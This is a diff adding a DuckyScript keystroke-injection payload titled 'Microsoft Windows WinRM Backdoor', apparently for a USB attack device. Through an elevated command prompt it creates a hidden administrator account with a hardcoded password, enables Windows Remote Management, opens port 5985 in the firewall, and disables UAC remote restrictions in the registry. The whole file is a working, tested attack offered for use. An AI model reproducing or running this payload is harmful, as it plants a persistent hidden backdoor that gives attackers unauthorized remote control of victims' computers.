@@ -1,0 +1,81 @@
+REM #
+REM # Title:            "Microsoft Windows" WinRM Backdoor
+REM #
+REM # Description:      
+REM #                   1) Adds a user account (RD_User:RD_P@ssW0rD).
+REM #                   2) Adds this local user to local administrator group.
+REM #                   3) Enables "Windows Remote Management" with default settings.
+REM #                   4) Adds a rule to the firewall.
+REM #                   5) Sets a value to "LocalAccountTokenFilterPolicy" to disable "UAC" remote restrictions.
+REM #                   6) Hides this user account.
+REM #
+REM # Author:           TW-D
+REM # Version:          1.0
+REM # Category:         Remote Access
+REM # Target:           Microsoft Windows
+REM #
+REM # TESTED ON
+REM # ===============
+REM # Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
+REM # Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+REM #
+REM # REQUIREMENTS
+REM # ===============
+REM # The target user must belong to the 'Administrators' group.
+REM #
+
+REM ######## INITIALIZATION ########
+
+DELAY 2000
+
+REM ######## STAGE1 ########
+
+GUI r
+DELAY 3000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 3000
+LEFTARROW
+DELAY 5000
+ENTER
+DELAY 5000
+
+REM ######## STAGE2 ########
+
+STRING NET USER RD_User RD_P@ssW0rD /ADD
+ENTER
+DELAY 1500
+
+STRING NET LOCALGROUP Administrators RD_User /ADD
+ENTER
+DELAY 1500
+
+REM ######## STAGE3 ########
+
+STRING WINRM QUICKCONFIG
+ENTER
+DELAY 4000
+
+STRING y
+ENTER
+DELAY 1500
+
+STRING NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Windows Remote Management for RD" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
+ENTER
+DELAY 1500
+
+REM ######## STAGE4 ########
+
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
+ENTER
+DELAY 1500
+
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v RD_User /t REG_DWORD /d 0
+ENTER
+DELAY 1500
+
+REM ######## FINISH ########
+
+STRING EXIT
+ENTER
